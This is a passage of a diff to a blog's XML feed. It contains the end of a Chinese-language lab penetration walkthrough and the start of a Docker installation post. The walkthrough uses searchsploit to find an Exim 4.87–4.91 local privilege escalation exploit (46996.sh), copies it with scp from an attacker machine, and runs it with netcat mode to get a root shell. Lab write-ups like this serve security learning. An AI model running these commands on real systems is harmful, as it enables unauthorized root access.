+<li><p>几经周转了解到<code>exim4</code>有已知的提权漏洞</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit exim</span><br><span class="line">Exim 4.87 - 4.91 - Local Privilege Escalation   | exploits/linux/<span class="built_in">local</span>/46996.sh</span><br><span class="line"><span class="comment"># 使用的是46996.sh</span></span><br><span class="line"><span class="comment"># 先把他复制到/tmp下改成exp.sh</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在靶机shell执行 </span></span><br><span class="line">scp root@192.168.0.21:/tmp/exp.sh /tmp</span><br><span class="line"><span class="comment"># 然后执行</span></span><br><span class="line">./exp.sh -m netcat</span><br><span class="line"><span class="comment"># 就能得到root的shell了</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img data-src="../images/mdImages/image-20200504232730631.png" alt="image-20200504232730631"></p>
+</li>
+<li><p><img data-src="../images/mdImages/image-20200504232745210.png" alt="image-20200504232745210"></p>
+</li>
+</ul>
+<h2><span id="the_end"><strong>THE_END!</strong></span></h2>]]></content>
+      <categories>
+        <category>靶机渗透</category>
+      </categories>
+      <tags>
+        <tag>网络渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker的安装</title>
     <url>/Docker-Install/</url>
     <content><![CDATA[<!-- toc -->
